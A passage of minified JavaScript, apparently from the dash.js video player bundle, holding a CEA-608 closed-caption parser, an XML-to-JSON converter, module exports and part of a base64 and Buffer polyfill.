N=G.time;null!==N&&this.outputFilter&&(this.outputFilter.updateData&&this.outputFilter.updateData(N,this.displayedMemory),null!==this.cueStartTime||this.displayedMemory.isEmpty()?this.displayedMemory.equals(this.lastOutputScreen)||(this.outputFilter.newCue&&this.outputFilter.newCue(this.cueStartTime,N,this.lastOutputScreen),this.cueStartTime=this.displayedMemory.isEmpty()?null:N):this.cueStartTime=N,this.lastOutputScreen.copy(this.displayedMemory))},cueSplitAtTime:function(N){this.outputFilter&&(this.displayedMemory.isEmpty()||(this.outputFilter.newCue&&this.outputFilter.newCue(this.cueStartTime,N,this.displayedMemory),this.cueStartTime=N))}},x.prototype={getHandler:function(N){return this.channels[N].getHandler()},setHandler:function(N,w){this.channels[N].setHandler(w)},addData:function(N,w){var h,F=!1;for(this.lastTime=N,G.setTime(N),N=0;N<w.length;N+=2){var P=127&w[N],O=127&w[N+1];16<=P&&31>=P&&P===this.lastCmdA&&O===this.lastCmdB?(this.lastCmdA=null,this.lastCmdB=null,G.log("DEBUG","Repeated command ("+p([P,O])+") is dropped")):0!=P||0!=O?(G.log("DATA","["+p([w[N],w[N+1]])+"] -> ("+p([P,O])+")"),(h=(h=(h=(h=this.parseCmd(P,O))||this.parseMidrow(P,O))||this.parsePAC(P,O))||this.parseBackgroundAttributes(P,O))||(F=this.parseChars(P,O))&&(this.currChNr&&0<=this.currChNr?this.channels[this.currChNr-1].insertChars(F):G.log("WARNING","No channel found yet. TEXT-MODE?")),h?this.dataCounters.cmd+=2:F?this.dataCounters.char+=2:(this.dataCounters.other+=2,G.log("WARNING","Couldn't parse cleaned data "+p([P,O])+" orig: "+p([w[N],w[N+1]])))):this.dataCounters.padding+=2}},parseCmd:function(N,w){if(!((20===N||21===N||28===N||29===N)&&32<=w&&47>=w||(23===N||31===N)&&33<=w&&35>=w))return!1;var h=20===N||21===N||23===N?1:2,F=this.channels[h-1];return 20===N||21===N||28===N||29===N?32===w?F.cc_RCL():33===w?F.cc_BS():34===w?F.cc_AOF():35===w?F.cc_AON():36===w?F.cc_DER():37===w?F.cc_RU(2):38===w?F.cc_RU(3):39===w?F.cc_RU(4):40===w?F.cc_FON():41===w?F.cc_RDC():42===w?F.cc_TR():43===w?F.cc_RTD():44===w?F.cc_EDM():45===w?F.cc_CR():46===w?F.cc_ENM():47===w&&F.cc_EOC():F.cc_TO(w-32),this.lastCmdA=N,this.lastCmdB=w,this.currChNr=h,!0},parseMidrow:function(N,w){var h;return(17===N||25===N)&&32<=w&&47>=w&&((h=17===N?1:2)!==this.currChNr?(G.log("ERROR","Mismatch channel in midrow parsing"),!1):((h=this.channels[h-1]).insertChars([32]),h.cc_MIDROW(w),G.log("DEBUG","MIDROW ("+p([N,w])+")"),this.lastCmdA=N,this.lastCmdB=w,!0))},parsePAC:function(N,w){if(!((17<=N&&23>=N||25<=N&&31>=N)&&64<=w&&127>=w||(16===N||24===N)&&64<=w&&95>=w))return!1;var h=23>=N?1:2,F=this.interpretPAC(64<=w&&95>=w?1==h?J[N]:D[N]:1==h?E[N]:I[N],w);return this.channels[h-1].setPAC(F),this.lastCmdA=N,this.lastCmdB=w,this.currChNr=h,!0},interpretPAC:function(N,w){return(N={color:null,italics:!1,indent:null,underline:!1,row:N}).underline=!(1&~(w=95<w?w-96:w-64)),13>=w?N.color="white green blue cyan red yellow magenta white".split(" ")[Math.floor(w/2)]:15>=w?(N.italics=!0,N.color="white"):N.indent=4*Math.floor((w-16)/2),N},parseChars:function(N,w){var h,F,R,P=null,O=null;return 17<=(R=25<=N?(P=2,N-8):(P=1,N))&&19>=R?(h=17===R?w+80:18===R?w+112:w+144,G.log("INFO","Special char '"+m(h)+"' in channel "+P),O=[h],this.lastCmdA=N,this.lastCmdB=w):32<=N&&127>=N&&(O=0===w?[N]:[N,w],this.lastCmdA=null,this.lastCmdB=null),O&&(F=p(O),G.log("DEBUG","Char codes =  "+F.join(","))),O},parseBackgroundAttributes:function(N,w){var h,F,P;return((16===N||24===N)&&32<=w&&47>=w||(23===N||31===N)&&45<=w&&47>=w)&&(h={},16===N||24===N?(F=Math.floor((w-32)/2),h.background=L[F],1==w%2&&(h.background+="_semi")):45===w?h.background="transparent":(h.foreground="black",47===w&&(h.underline=!0)),P=24>N?1:2,this.channels[P-1].setBkgData(h),this.lastCmdA=N,this.lastCmdB=w,!0)},reset:function(){for(var N=0;N<this.channels.length;N++)this.channels[N]&&this.channels[N].reset();this.lastCmdB=this.lastCmdA=null},cueSplitAtTime:function(N){for(var w=0;w<this.channels.length;w++)this.channels[w]&&this.channels[w].cueSplitAtTime(N)}},v.logger=G,v.PenState=l,v.CaptionScreen=t,v.Cea608Parser=x,v.findCea608Nalus=function(N,w,h){for(var F,P=w,O=[];P<w+h;){if(F=N.getUint32(P),6==(31&N.getUint8(P+4)))for(var Q,R=P+5;R<P+4+F-1;){Q=0;for(var ja=255;255===ja;)Q+=ja=N.getUint8(R),R++;var W=0;for(ja=255;255===ja;)W+=ja=N.getUint8(R),R++;ja=N;var aa=R;if(4!==Q||8>W)ja=null;else{Q=ja.getUint8(aa);var ma=ja.getUint16(aa+1),H=ja.getUint32(aa+3);ja=ja.getUint8(aa+7),ja=181==Q&&49==ma&&1195456820==H&&3==ja}!ja||O.push([R,W]),R+=W}P+=F+4}return O},v.extractCea608DataFromRange=function(N,w){w=w[0];var h=[[],[]];w+=8;var F=31&N.getUint8(w);w+=2;for(var P=0;P<F;P++){var O=N.getUint8(w),R=4&O;O&=3,w++;var Q=N.getUint8(w);w++;var ja=N.getUint8(w);w++,R&&0!=(127&Q)+(127&ja)&&(0==O?(h[0].push(Q),h[0].push(ja)):1==O&&(h[1].push(Q),h[1].push(ja)))}return h}}(void 0===M?(void 0).cea608parser={}:M)},{}],3:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0}),M.default=function(v){function m(G){var N=G.localName;return null==N&&(N=G.baseName),null!=N&&""!=N||(N=G.nodeName),N}function p(G){return"string"==typeof G?G.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&apos;"):G}function l(G,N,w,h){for(var F=0;F<G.length;F++){var P=G[F];if("string"==typeof P){if(P==h)break}else if(P instanceof RegExp){if(P.test(h))break}else if("function"==typeof P&&P(N,w,h))break}return F!=G.length}function f(G,N,w){"property"===v.arrayAccessForm&&(G[N]instanceof Array?G[N+"_asArray"]=G[N]:G[N+"_asArray"]=[G[N]]),!(G[N]instanceof Array)&&0<v.arrayAccessFormPaths.length&&l(v.arrayAccessFormPaths,G,N,w)&&(G[N]=[G[N]])}function g(G){var N,w=G.split(/[-T:+Z]/g),h=new Date(w[0],w[1]-1,w[2]),F=w[5].split(".");return h.setHours(w[3],w[4],F[0]),1<F.length&&h.setMilliseconds(F[1]),w[6]&&w[7]?(N=60*w[6]+Number(w[7]),N=0+("-"==(/\d\d-\d\d:\d\d$/.test(G)?"-":"+")?-1*N:N),h.setMinutes(h.getMinutes()-N-h.getTimezoneOffset())):-1!==G.indexOf("Z",G.length-1)&&(h=new Date(Date.UTC(h.getFullYear(),h.getMonth(),h.getDate(),h.getHours(),h.getMinutes(),h.getSeconds(),h.getMilliseconds()))),h}function t(G,N){if(G.nodeType==L.DOCUMENT_NODE){for(var w={},h=G.childNodes,F=0;F<h.length;F++)(O=h[F]).nodeType==L.ELEMENT_NODE&&(v.ignoreRoot?w=t(O):(w={})[W=m(O)]=t(O));return w}if(G.nodeType==L.ELEMENT_NODE){(w={}).__cnt=0;var P=[];for(h=G.childNodes,F=0;F<h.length;F++){var O,R,Q,ja,W=m(O=h[F]);O.nodeType!=L.COMMENT_NODE&&(aa=w,H=W,B=R=N+"."+W,O.nodeType==L.ELEMENT_NODE&&0<v.xmlElementsFilter.length&&!l(v.xmlElementsFilter,aa,H,B)||(w.__cnt++,null==w[W]?(Q=t(O,R),"#text"==W&&!/[^\s]/.test(Q)||((ja={})[W]=Q,P.push(ja)),w[W]=Q,f(w,W,R)):(null!=w[W]&&(w[W]instanceof Array||(w[W]=[w[W]],f(w,W,R))),Q=t(O,R),"#text"==W&&!/[^\s]/.test(Q)||((ja={})[W]=Q,P.push(ja)),w[W][w[W].length]=Q)))}for(w.__children=P,h=m(G),F=0;F<G.attributes.length;F++){for(P=G.attributes[F],w.__cnt++,O=P.value,R=0,Q=v.matchers.length;R<Q;R++)(ja=v.matchers[R]).test(P,h)&&(O=ja.converter(P.value));w[v.attributePrefix+P.name]=O}return null!=(G=G.prefix)&&""!=G&&(w.__cnt++,w.__prefix=G),null!=w["#text"]&&(w.__text=w["#text"],w.__text instanceof Array&&(w.__text=w.__text.join("\n")),v.stripWhitespaces&&(w.__text=w.__text.trim()),delete w["#text"],"property"==v.arrayAccessForm&&delete w["#text_asArray"],w.__text=(A=w.__text,Y=W,Z=N+"."+W,0<v.datetimeAccessFormPaths.length?(Z=Z.split(".#")[0],l(v.datetimeAccessFormPaths,A,Y,Z)?g(A):A):A)),null!=w["#cdata-section"]&&(w.__cdata=w["#cdata-section"],delete w["#cdata-section"],"property"==v.arrayAccessForm&&delete w["#cdata-section_asArray"]),0==w.__cnt&&"text"==v.emptyNodeForm?w="":1==w.__cnt&&null!=w.__text?w=w.__text:1!=w.__cnt||null==w.__cdata||v.keepCData?1<w.__cnt&&null!=w.__text&&v.skipEmptyTextNodesForObj&&(v.stripWhitespaces&&""==w.__text||""==w.__text.trim())&&delete w.__text:w=w.__cdata,delete w.__cnt,!v.enableToStringFunc||null==w.__text&&null==w.__cdata||(w.toString=function(){return(null!=this.__text?this.__text:"")+(null!=this.__cdata?this.__cdata:"")}),w}var A,Y,Z,aa,H,B;if(G.nodeType==L.TEXT_NODE||G.nodeType==L.CDATA_SECTION_NODE)return G.nodeValue}function r(G,N,w,h){if(N="<"+(null!=G&&null!=G.__prefix?G.__prefix+":":"")+N,null!=w)for(var F=0;F<w.length;F++){var P=w[F],O=G[P];v.escapeMode&&(O=p(O)),N+=" "+P.substr(v.attributePrefix.length)+"=",v.useDoubleQuotes?N+='"'+O+'"':N+="'"+O+"'"}return N+(h?"/>":">")}function x(G,N){return"</"+(null!=G.__prefix?G.__prefix+":":"")+N+">"}function z(G,N){return"property"==v.arrayAccessForm&&(h="_asArray",-1!==(w=N.toString()).indexOf(h,w.length-8))||0==N.toString().indexOf(v.attributePrefix)||0==N.toString().indexOf("__")||G[N]instanceof Function;var w,h}function J(G){var N=0;if(G instanceof Object)for(var w in G)z(G,w)||N++;return N}function E(G){var N=[];if(G instanceof Object)for(var w in G)-1==w.toString().indexOf("__")&&0==w.toString().indexOf(v.attributePrefix)&&N.push(w);return N}function D(G){var N,w="";return G instanceof Object?w+=(N="",null!=G.__cdata&&(N+="<![CDATA["+G.__cdata+"]]>"),null!=G.__text&&(v.escapeMode?N+=p(G.__text):N+=G.__text),N):null!=G&&(v.escapeMode?w+=p(G):w+=G),w}function I(G,N){var w,h,F,P="";if(0<J(G))for(var O in G){if((h=!z(G,O))&&!(h=""==N)){h=G;var R=w=O;F=""===N?R:N+"."+R,h=0==v.jsonPropertiesFilter.length||""==F||l(v.jsonPropertiesFilter,h,w,F)}if(h)if(h=E(w=G[O]),null==w||null==w)P+=r(w,O,h,!0);else if(w instanceof Object)if(w instanceof Array){R=O;var Q=N,ja="";if(0==w.length)ja+=r(w,R,h,!0);else for(h=0;h<w.length;h++)ja+=r(w[h],R,E(w[h]),!1),ja+=I(w[h],""===Q?R:Q+"."+R),ja+=x(w[h],R);P+=ja}else w instanceof Date?(P+=r(w,O,h,!1),P+=w.toISOString(),P+=x(w,O)):0<J(w)||null!=w.__text||null!=w.__cdata?(P+=r(w,O,h,!1),P+=I(w,""===N?O:N+"."+O),P+=x(w,O)):P+=r(w,O,h,!0);else P+=r(w,O,h,!1),P+=D(w),P+=x(w,O)}return P+D(G)}void 0===(v=v||{}).escapeMode&&(v.escapeMode=!0),void 0===v.attributePrefix&&(v.attributePrefix="_"),v.arrayAccessForm=v.arrayAccessForm||"none",v.emptyNodeForm=v.emptyNodeForm||"text",void 0===v.enableToStringFunc&&(v.enableToStringFunc=!0),v.arrayAccessFormPaths=v.arrayAccessFormPaths||[],void 0===v.skipEmptyTextNodesForObj&&(v.skipEmptyTextNodesForObj=!0),void 0===v.stripWhitespaces&&(v.stripWhitespaces=!0),v.datetimeAccessFormPaths=v.datetimeAccessFormPaths||[],void 0===v.useDoubleQuotes&&(v.useDoubleQuotes=!1),v.xmlElementsFilter=v.xmlElementsFilter||[],v.jsonPropertiesFilter=v.jsonPropertiesFilter||[],void 0===v.keepCData&&(v.keepCData=!1),void 0===v.ignoreRoot&&(v.ignoreRoot=!1);var L={ELEMENT_NODE:1,TEXT_NODE:3,CDATA_SECTION_NODE:4,COMMENT_NODE:8,DOCUMENT_NODE:9};this.parseXmlString=function(G){var N;if(wa.ActiveXObject,void 0===G)return null;if(wa.DOMParser){var w=new wa.DOMParser;try{0<(N=w.parseFromString(G,"text/xml")).getElementsByTagNameNS("*","parsererror").length&&(N=null)}catch(h){N=null}}else 0==G.indexOf("<?")&&(G=G.substr(G.indexOf("?>")+2)),(N=new ActiveXObject("Microsoft.XMLDOM")).async="false",N.loadXML(G);return N},this.asArray=function(G){return void 0===G||null==G?[]:G instanceof Array?G:[G]},this.toXmlDateTime=function(G){return G instanceof Date?G.toISOString():"number"==typeof G?new Date(G).toISOString():null},this.asDateTime=function(G){return"string"==typeof G?g(G):G},this.xml2json=function(G){return t(G)},this.xml_str2json=function(G){return null!=(G=this.parseXmlString(G))?this.xml2json(G):null},this.json2xml_str=function(G){return I(G,"")},this.json2xml=function(G){return G=this.json2xml_str(G),this.parseXmlString(G)},this.getVersion=function(){return"1.2.0"}},da.exports=M.default},{}],4:[function(u,da,M){function v(f){return f&&f.__esModule?f:{default:f}}Object.defineProperty(M,"__esModule",{value:!0}),da=u(5);var m=v(u(124)),p=v(u(161)),l=v(u(102));u=v(u(45)),Na.Protection=p.default,Na.MetricsReporting=m.default,Na.MediaPlayerFactory=l.default,Na.Debug=u.default,M.default=Na,M.MediaPlayer=da.MediaPlayer,M.Protection=p.default,M.MetricsReporting=m.default,M.MediaPlayerFactory=l.default,M.Debug=u.default},{102:102,124:124,161:161,45:45,5:5}],5:[function(u,da,M){(function(v){function m(r){return r&&r.__esModule?r:{default:r}}Object.defineProperty(M,"__esModule",{value:!0});var p=m(u(100)),l=m(u(47)),f=m(u(45)),g=u(50),t=(v=void 0!==wa&&wa||v).dashjs;(t=t||(v.dashjs={})).MediaPlayer=p.default,t.FactoryMaker=l.default,t.Debug=f.default,t.Version=(0,g.getVersionString)(),M.default=t,M.MediaPlayer=p.default,M.FactoryMaker=l.default,M.Debug=f.default}).call(this,"undefined"!=typeof global?global:"undefined"!=typeof self?self:void 0!==wa?wa:{})},{100:100,45:45,47:47,50:50}],6:[function(u,da,M){function v(f){var g=f.length;if(0<g%4)throw Error("Invalid string. Length must be a multiple of 4");return-1===(f=f.indexOf("="))&&(f=g),[f,f===g?0:4-f%4]}M.byteLength=function(f){var g=(f=v(f))[1];return 3*(f[0]+g)/4-g},M.toByteArray=function(f){var g=v(f),t=g[0];g=g[1];var r=new l(3*(t+g)/4-g),x=0;t=0<g?t-4:t;for(var z=0;z<t;z+=4){var J=p[f.charCodeAt(z)]<<18|p[f.charCodeAt(z+1)]<<12|p[f.charCodeAt(z+2)]<<6|p[f.charCodeAt(z+3)];r[x++]=J>>16&255,r[x++]=J>>8&255,r[x++]=255&J}return 2===g&&(J=p[f.charCodeAt(z)]<<2|p[f.charCodeAt(z+1)]>>4,r[x++]=255&J),1===g&&(J=p[f.charCodeAt(z)]<<10|p[f.charCodeAt(z+1)]<<4|p[f.charCodeAt(z+2)]>>2,r[x++]=J>>8&255,r[x++]=255&J),r},M.fromByteArray=function(f){for(var g,t=f.length,r=t%3,x=[],z=0,J=t-r;z<J;z+=16383)x.push(function(E,D,I){for(var L=[],G=D;G<I;G+=3)D=(E[G]<<16&16711680)+(E[G+1]<<8&65280)+(255&E[G+2]),L.push(m[D>>18&63]+m[D>>12&63]+m[D>>6&63]+m[63&D]);return L.join("")}(f,z,J<z+16383?J:z+16383));return 1==r?(g=f[t-1],x.push(m[g>>2]+m[g<<4&63]+"==")):2==r&&(g=(f[t-2]<<8)+f[t-1],x.push(m[g>>10]+m[g>>4&63]+m[g<<2&63]+"=")),x.join("")};var m=[],p=[],l="undefined"!=typeof Uint8Array?Uint8Array:Array;for(u=0;64>u;++u)m[u]="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[u],p["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".charCodeAt(u)]=u;p[45]=62,p[95]=63},{}],7:[function(u,da,M){},{}],8:[function(u,da,M){function v(H){if(W<H)throw new RangeError('The value "'+H+'" is invalid for option "size"');return(H=new Uint8Array(H)).__proto__=m.prototype,H}function m(H,B,A){if("number"!=typeof H)return p(H,B,A);if("string"==typeof B)throw new TypeError('The "string" argument must be of type string. Received type number');return f(H)}function p(H,B,A){if("string"==typeof H)return function(Z,na){if("string"==typeof na&&""!==na||(na="utf8"),!m.isEncoding(na))throw new TypeError("Unknown encoding: "+na);var T=0|r(Z,na),pa=v(T);return(Z=pa.write(Z,na))!==T&&(pa=pa.slice(0,Z)),pa}(H,B);if(ArrayBuffer.isView(H))return g(H);if(null==H)throw TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type "+typeof H);if(R(H,ArrayBuffer)||H&&R(H.buffer,ArrayBuffer))return function(Z,na,T){if(0>na||Z.byteLength<na)throw new RangeError('"offset" is outside of buffer bounds');if(Z.byteLength<na+(T||0))throw new RangeError('"length" is outside of buffer bounds');return(Z=void 0===na&&void 0===T?new Uint8Array(Z):void 0===T?new Uint8Array(Z,na):new Uint8Array(Z,na,T)).__proto__=m.prototype,Z}(H,B,A);if("number"==typeof H)throw new TypeError('The "value" argument must not be of type number. Received type number');var Y=H.valueOf&&H.valueOf();if(null!=Y&&Y!==H)return m.from(Y,B,A);if(Y=function(Z){if(m.isBuffer(Z)){var na=0|t(Z.length),T=v(na);return 0===T.length||Z.copy(T,0,0,na),T}return void 0!==Z.length?((na="number"!=typeof Z.length)||(na=(na=Z.length)!=na),na?v(0):g(Z)):"Buffer"===Z.type&&Array.isArray(Z.data)?g(Z.data):void 0}(H))return Y;if("undefined"!=typeof Symbol&&null!=Symbol.toPrimitive&&"function"==typeof H[Symbol.toPrimitive])return m.from(H[Symbol.toPrimitive]("string"),B,A);throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type "+typeof H)}function l(H){if("number"!=typeof H)throw new TypeError('"size" argument must be of type number');if(0>H)throw new RangeError('The value "'+H+'" is invalid for option "size"')}function f(H){return l(H),v(0>H?0:0|t(H))}function g(H){for(var B=0>H.length?0:0|t(H.length),A=v(B),Y=0;Y<B;Y+=1)A[Y]=255&H[Y];return A}function t(H){if(W<=H)throw new RangeError("Attempt to allocate Buffer larger than maximum size: 0x"+W.toString(16)+" bytes");return 0|H}function r(H,B){if(m.isBuffer(H))return H.length;if(ArrayBuffer.isView(H)||R(H,ArrayBuffer))return H.byteLength;if("string"!=typeof H)throw new TypeError('The "string" argument must be one of type string, Buffer, or ArrayBuffer. Received type '+typeof H);var A=H.length,Y=2<arguments.length&&!0===arguments[2];if(!Y&&0===A)return 0;for(var Z=!1;;)switch(B){case"ascii":case"latin1":case"binary":return A;case"utf8":case"utf-8":return F(H).length;case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return 2*A;case"hex":return A>>>1;case"base64":return P(H).length;default:if(Z)return Y?-1:F(H).length;B=(""+B).toLowerCase(),Z=!0}}function x(H,B,A){var Y,Z,na=!1;if((void 0===B||0>B)&&(B=0),B>this.length||((void 0===A||A>this.length)&&(A=this.length),0>=A)||(A>>>=0)<=(B>>>=0))return"";for(H=H||"utf8";;)switch(H){case"hex":return function(T,pa,ia){var S=T.length;for((!pa||0>pa)&&(pa=0),(!ia||0>ia||S<ia)&&(ia=S),S="";pa<ia;++pa){var V=T[pa];S+=V=16>V?"0"+V.toString(16):V.toString(16)}return S}(this,B,A);case"utf8":case"utf-8":return I(this,B,A);case"ascii":return function(T,pa,ia){var S="";for(ia=Math.min(T.length,ia);pa<ia;++pa)S+=String.fromCharCode(127&T[pa]);return S}(this,B,A);case"latin1":case"binary":return function(T,pa,ia){var S="";for(ia=Math.min(T.length,ia);pa<ia;++pa)S+=String.fromCharCode(T[pa]);return S}(this,B,A);case"base64":return Z=A,0===(Y=B)&&Z===this.length?Q.fromByteArray(this):Q.fromByteArray(this.slice(Y,Z));case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return function(T,pa,ia){for(T=T.slice(pa,ia),pa="",ia=0;ia<T.length;ia+=2)pa+=String.fromCharCode(T[ia]+256*T[ia+1]);return pa}(this,B,A);default:if(na)throw new TypeError("Unknown encoding: "+H);H=(H+"").toLowerCase(),na=!0}}function z(H,B,A){var Y=H[B];H[B]=H[A],H[A]=Y}function J(H,B,A,Y,Z){if(0===H.length)return-1;"string"==typeof A?(Y=A,A=0):2147483647<A?A=2147483647:-2147483648>A&&(A=-2147483648);var na=A=+A;if(na!=na&&(A=Z?0:H.length-1),0>A&&(A=H.length+A),A>=H.length){if(Z)return-1;A=H.length-1}else if(0>A){if(!Z)return-1;A=0}if("string"==typeof B&&(B=m.from(B,Y)),m.isBuffer(B))return 0===B.length?-1:E(H,B,A,Y,Z);if("number"==typeof B)return B&=255,"function"==typeof Uint8Array.prototype.indexOf?Z?Uint8Array.prototype.indexOf.call(H,B,A):Uint8Array.prototype.lastIndexOf.call(H,B,A):E(H,[B],A,Y,Z);throw new TypeError("val must be string, number or Buffer")}function E(H,B,A,Y,Z){function na(S,V){return 1===T?S[V]:S.readUInt16BE(V*T)}var T=1,pa=H.length,ia=B.length;if(void 0!==Y&&("ucs2"===(Y=String(Y).toLowerCase())||"ucs-2"===Y||"utf16le"===Y||"utf-16le"===Y)){if(2>H.length||2>B.length)return-1;pa/=T=2,ia/=2,A/=2}if(Z)for(Y=-1;A<pa;A++)if(na(H,A)===na(B,-1===Y?0:A-Y)){if(-1===Y&&(Y=A),A-Y+1===ia)return Y*T}else-1!==Y&&(A-=A-Y),Y=-1;else for(pa<A+ia&&(A=pa-ia);0<=A;A--){for(pa=!0,Y=0;Y<ia;Y++)if(na(H,A+Y)!==na(B,Y)){pa=!1;break}if(pa)return A}return-1}function D(H,B,A,Y){for(var Z=[],na=0;na<B.length;++na)Z.push(255&B.charCodeAt(na));return O(Z,H,A,Y)}function I(H,B,A){A=Math.min(H.length,A);for(var Y=[];B<A;){var Z,na,T=H[B],pa=null,ia=239<T?4:223<T?3:191<T?2:1;if(B+ia<=A)switch(ia){case 1:128>T&&(pa=T);break;case 2:128==(192&(Z=H[B+1]))&&127<(na=(31&T)<<6|63&Z)&&(pa=na);break;case 3:Z=H[B+1];var S=H[B+2];128==(192&Z)&&128==(192&S)&&2047<(na=(15&T)<<12|(63&Z)<<6|63&S)&&(55296>na||57343<na)&&(pa=na);break;case 4:Z=H[B+1],S=H[B+2];var V=H[B+3];128==(192&Z)&&128==(192&S)&&128==(192&V)&&65535<(na=(15&T)<<18|(63&Z)<<12|(63&S)<<6|63&V)&&1114112>na&&(pa=na)}null===pa?(pa=65533,ia=1):65535<pa&&(pa-=65536,Y.push(pa>>>10&1023|55296),pa=56320|1023&pa),Y.push(pa),B+=ia}if((H=Y.length)<=aa)Y=String.fromCharCode.apply(String,Y);else{for(A="",Z=0;Z<H;)A+=String.fromCharCode.apply(String,Y.slice(Z,Z+=aa));Y=A}return Y}function L(H,B,A){if(0!=H%1||0>H)throw new RangeError("offset is not uint");if(A<H+B)throw new RangeError("Trying to access beyond buffer length")}function G(H,B,A,Y,Z,na){if(!m.isBuffer(H))throw new TypeError('"buffer" argument must be a Buffer instance');if(Z<B||B<na)throw new RangeError('"value" argument is out of bounds');if(A+Y>H.length)throw new RangeError("Index out of range")}function N(H,B,A,Y){if(A+Y>H.length)throw new RangeError("Index out of range");if(0>A)throw new RangeError("Index out of range")}function w(H,B,A,Y,Z){return B=+B,A>>>=0,Z||N(H,0,A,4),ja.write(H,B,A,Y,23,4),A+4}function h(H,B,A,Y,Z){return B=+B,A>>>=0,Z||N(H,0,A,8),ja.write(H,B,A,Y,52,8),A+8}function F(H,B){var A;B=B||1/0;for(var Y=H.length,Z=null,na=[],T=0;T<Y;++T){if(55295<(A=H.charCodeAt(T))&&57344>A){if(!Z){if(56319<A){-1<(B-=3)&&na.push(239,191,189);continue}if(T+1===Y){-1<(B-=3)&&na.push(239,191,189);continue}Z=A;continue}if(56320>A){-1<(B-=3)&&na.push(239,191,189),Z=A;continue}A=65536+(Z-55296<<10|A-56320)}else Z&&-1<(B-=3)&&na.push(239,191,189);if(Z=null,128>A){if(0>--B)break;na.push(A)}else if(2048>A){if(0>(B-=2))break;na.push(A>>6|192,63&A|128)}else if(65536>A){if(0>(B-=3))break;na.push(A>>12|224,A>>6&63|128,63&A|128)}else{if(!(1114112>A))throw Error("Invalid code point");if(0>(B-=4))break;na.push(A>>18|240,A>>12&63|128,A>>6&63|128,63&A|128)}}return na}function P(H){return Q.toByteArray(function(B){if(2>(B=(B=B.split("=")[0]).trim().replace(ma,"")).length)return"";for(;0!=B.length%4;)B+="=";return B}(H))}function O(H,B,A,Y){for(var Z=0;Z<Y&&!(Z+A>=B.length||Z>=H.length);++Z)B[Z+A]=H[Z];return Z}function R(H,B){return H instanceof B||null!=H&&null!=H.constructor&&null!=H.constructor.name&&H.constructor.name===B.name}var Q=u(6),ja=u(13);M.Buffer=m,M.SlowBuffer=function(H){return+H!=H&&(H=0),m.alloc(+H)},M.INSPECT_MAX_BYTES=50;var W=2147483647;M.kMaxLength=W,(m.TYPED_ARRAY_SUPPORT=function(){try{var H=new Uint8Array(1);return H.__proto__={__proto__:Uint8Array.prototype,foo:function(){return 42}},42===H.foo()}catch(B){return!1}}())||"undefined"==typeof console||"function"!=typeof console.error||console.error("This browser lacks typed array (Uint8Array) support which is required by `buffer` v5.x. Use `buffer` v4.x if you require old browser support."),Object.defineProperty(m.prototype,"parent",{enumerable:!0,get:function(){if(m.isBuffer(this))return this.buffer}}),Object.defineProperty(m.prototype,"offset",{enumerable:!0,get:function(){if(m.isBuffer(this))return this.byteOffset}}),"undefined"!=typeof Symbol&&null!=Symbol.species&&m[Symbol.species]===m&&Object.defineProperty(m,Symbol.species,{value:null,configurable:!0,enumerable:!1,writable:!1}),m.poolSize=8192,m.from=p,m.prototype.__proto__=Uint8Array.prototype,m.__proto__=Uint8Array,m.alloc=function(H,B,A){return Z=B,na=A,l(Y=H),0>=Y||void 0===Z?v(Y):"string"==typeof na?v(Y).fill(Z,na):v(Y).fill(Z);var Y,Z,na},m.allocUnsafe=f,m.allocUnsafeSlow=f,m.isBuffer=function(H){return null!=H&&!0===H._isBuffer&&H!==m.prototype},m.compare=function(H,B){if(R(H,Uint8Array)&&(H=m.from(H,H.offset,H.byteLength)),R(B,Uint8Array)&&(B=m.from(B,B.offset,B.byteLength)),!m.isBuffer(H)||!m.isBuffer(B))throw new TypeError('The "buf1", "buf2" arguments must be one of type Buffer or Uint8Array');if(H===B)return 0;for(var A=H.length,Y=B.length,Z=0,na=Math.min(A,Y);Z<na;++Z)if(H[Z]!==B[Z]){A=H[Z],Y=B[Z];break}return A<Y?-1:Y<A?1:0},m.isEncoding=function(H){switch(String(H).toLowerCase()){case"hex":case"utf8":case"utf-8":case"ascii":case"latin1":case"binary":case"base64":case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return!0;default:return!1}},m.concat=function(H,B){if(!Array.isArray(H))throw new TypeError('"list" argument must be an Array of Buffers');if(0===H.length)return m.alloc(0);if(void 0===B)for(Y=B=0;Y<H.length;++Y)B+=H[Y].length;B=m.allocUnsafe(B);for(var A=0,Y=0;Y<H.length;++Y){var Z=H[Y];if(R(Z,Uint8Array)&&(Z=m.from(Z)),!m.isBuffer(Z))throw new TypeError('"list" argument must be an Array of Buffers');Z.copy(B,A),A+=Z.length}return B},m.byteLength=r,m.prototype._isBuffer=!0,m.prototype.swap16=function(){var H=this.length;if(0!=H%2)throw new RangeError("Buffer size must be a multiple of 16-bits");for(var B=0;B<H;B+=2)z(this,B,B+1);return this},m.prototype.swap32=function(){var H=this.length;if(0!=H%4)throw new RangeError("Buffer size must be a multiple of 32-bits");for(var B=0;B<H;B+=4)z(this,B,B+3),z(this,B+1,B+2);return this},m.prototype.swap64=function(){var H=this.length;if(0!=H%8)throw new RangeError("Buffer size must be a multiple of 64-bits");for(var B=0;B<H;B+=8)z(this,B,B+7),z(this,B+1,B+6),z(this,B+2,B+5),z(this,B+3,B+4);return this},m.prototype.toLocaleString=m.prototype.toString=function(){var H=this.length;return 0===H?"":0===arguments.length?I(this,0,H):x.apply(this,arguments)},m.prototype.equals=function(H){if(!m.isBuffer(H))throw new TypeError("Argument must be a Buffer");return this===H||0===m.compare(this,H)},m.prototype.inspect=function(){var H=M.INSPECT_MAX_BYTES,B=this.toString("hex",0,H).replace(/(.{2})/g,"$1 ").trim();return this.length>H&&(B+=" ... "),"<Buffer "+B+">"},m.prototype.compare=function(H,B,A,Y,Z){if(R(H,Uint8Array)&&(H=m.from(H,H.offset,H.byteLength)),!m.isBuffer(H))throw new TypeError('The "target" argument must be one of type Buffer or Uint8Array. Received type '+typeof H);if(void 0===B&&(B=0),void 0===A&&(A=H?H.length:0),void 0===Y&&(Y=0),void 0===Z&&(Z=this.length),0>B||A>H.length||0>Y||Z>this.length)throw new RangeError("out of range 